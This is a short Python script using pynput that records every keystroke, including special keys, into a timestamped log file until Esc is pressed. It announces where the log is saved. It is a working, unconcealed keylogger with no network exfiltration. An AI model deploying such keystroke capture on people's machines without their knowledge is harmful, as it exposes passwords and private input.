
from pynput import keyboard
import logging
from datetime import datetime
import os

# Ensure logs directory exists
if not os.path.exists("logs"):
    os.makedirs("logs")

# Create log file with timestamp
log_filename = os.path.abspath(datetime.now().strftime("logs/keystrokes_%Y-%m-%d_%H-%M-%S.txt"))
print(f"Log file will be saved at : {log_filename}")
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
